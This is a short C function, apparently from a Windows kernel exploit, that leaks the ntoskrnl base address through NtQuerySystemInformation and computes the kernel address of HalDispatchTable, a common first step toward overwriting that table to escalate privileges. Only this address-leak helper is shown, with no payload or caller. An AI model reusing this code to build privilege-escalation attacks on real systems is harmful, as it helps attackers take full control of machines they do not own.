BOOL leakHal()
{
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQuerySystemInformation");
	PRTL_PROCESS_MODULES pModuleInfo;
	DWORD ntoskrnlBase;
	DWORD HalDTUser, HalDTOffset;
	HMODULE userKernel;

	pModuleInfo = (PRTL_PROCESS_MODULES)VirtualAlloc(NULL, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pModuleInfo == NULL)
	{
		printf("Could not allocate memory\n");
		return FALSE;
	}
	NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, 0x100000, NULL);
	ntoskrnlBase = (DWORD)pModuleInfo->Modules[0].ImageBase;
	userKernel = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (userKernel == NULL)
	{
		printf("Could not load ntoskrnl.exe\n");
		return FALSE;
	}

	HalDTUser = (DWORD)GetProcAddress(userKernel, "HalDispatchTable");
	HalDTOffset = HalDTUser - (DWORD)userKernel;
	g_HalDispatchTable = ntoskrnlBase + HalDTOffset + 0x9000;
	return TRUE;
}